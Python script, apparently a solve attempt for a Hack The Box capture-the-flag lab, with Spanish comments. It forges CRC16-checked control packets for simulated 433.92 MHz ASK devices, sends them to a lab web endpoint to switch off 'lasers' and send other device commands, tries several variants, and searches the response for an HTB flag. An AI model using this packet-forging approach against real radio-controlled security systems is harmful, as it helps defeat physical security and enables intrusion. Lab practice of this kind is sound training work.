#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 5: Usar Turn ON (0xEE) primero, luego Turn OFF
print("[*] INNOVACIÓN 5: Turn ON láseres primero, luego OFF")
s = requests.Session()
s.get(base_url)

for addr in [0xE1, 0xE2, 0xE3]:
    data = bytes([addr, 0xEE])  # Turn ON
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    time.sleep(0.1)

time.sleep(1)

for addr in [0xE1, 0xE2, 0xE3]:
    data = bytes([addr, 0xFF])  # Turn OFF
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    time.sleep(0.1)

for addr in [0xA1, 0xA2, 0xA3, 0xA4]:
    data = bytes([addr, 0xF1])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    time.sleep(0.1)

time.sleep(2)
r = s.get(base_url)
if re.findall(r'HTB\{[^}]+\}', r.text):
    print("[SUCCESS]", re.findall(r'HTB\{[^}]+\}', r.text))
else:
    print("[-] No flag")

# INNOVACIÓN 6: Probar frecuencias ligeramente diferentes
print("\n[*] INNOVACIÓN 6: Probar frecuencias cercanas")
for freq in ['433.90', '433.91', '433.92', '433.93', '433.94', '434.00']:
    s = requests.Session()
    s.get(base_url)
    
    for addr in [0xE1, 0xE2, 0xE3]:
        data = bytes([addr, 0xFF])
        crc = crc16(data)
        packet = (data + struct.pack('<H', crc)).hex().upper()
        s.post(f'{base_url}/transmit', data={'freq': freq, 'mod': 'ASK', 'bits': '1', 'msg': packet})
    
    for addr in [0xA1, 0xA2, 0xA3, 0xA4]:
        data = bytes([addr, 0xF1])
        crc = crc16(data)
        packet = (data + struct.pack('<H', crc)).hex().upper()
        s.post(f'{base_url}/transmit', data={'freq': freq, 'mod': 'ASK', 'bits': '1', 'msg': packet})
    
    time.sleep(2)
    r = s.get(base_url)
    if re.findall(r'HTB\{[^}]+\}', r.text):
        print(f"[SUCCESS with freq {freq}]", re.findall(r'HTB\{[^}]+\}', r.text))
        break

# INNOVACIÓN 7: Enviar solo comandos sin dirección
print("\n[*] INNOVACIÓN 7: Comandos sin dirección")
s = requests.Session()
s.get(base_url)

for cmd in [0xF1, 0xFF]:
    data = bytes([cmd])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    for _ in range(7):  # 7 dispositivos
        s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
        time.sleep(0.05)

time.sleep(2)
r = s.get(base_url)
if re.findall(r'HTB\{[^}]+\}', r.text):
    print("[SUCCESS]", re.findall(r'HTB\{[^}]+\}', r.text))
else:
    print("[-] No flag")

# INNOVACIÓN 8: Orden inverso de direcciones
print("\n[*] INNOVACIÓN 8: Enviar en orden inverso")
s = requests.Session()
s.get(base_url)

for addr in [0xA4, 0xA3, 0xA2, 0xA1]:
    data = bytes([addr, 0xF1])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    time.sleep(0.1)

for addr in [0xE3, 0xE2, 0xE1]:
    data = bytes([addr, 0xFF])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    time.sleep(0.1)

time.sleep(2)
r = s.get(base_url)
if re.findall(r'HTB\{[^}]+\}', r.text):
    print("[SUCCESS]", re.findall(r'HTB\{[^}]+\}', r.text))
else:
    print("[-] No flag")
